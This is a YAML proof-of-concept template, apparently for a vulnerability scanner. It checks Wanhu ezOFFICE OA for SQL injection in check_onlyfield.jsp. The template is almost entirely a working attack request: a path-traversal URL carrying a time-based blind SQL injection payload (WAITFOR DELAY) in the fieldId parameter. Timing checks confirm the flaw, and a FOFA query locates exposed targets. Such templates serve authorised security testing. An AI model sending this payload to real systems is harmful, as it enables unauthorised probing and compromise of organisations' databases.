id: poc-yaml-whir-oa-check-onlyfield-sqli
info:
  name: 万户OA  check_onlyfield SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 万户OA ezoffice
  fofa: app="ezOFFICE协同管理平台"
variables:
  random: random_int(5,8)
  random1: random + 1
requests:
- method: GET
  path: /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_form/run/checkform/check_onlyfield.jsp?fieldId=1)WAITFOR%20DELAY%20%270:0:{{.random}}%27--
  expression: 'status_code == 200 &&

    contains(headers,"text/html") &&

    contains(headers,"SESSIONID") &&

    trim(body) == "" &&

    duration > random &&

    duration < random1

    '
transport: http
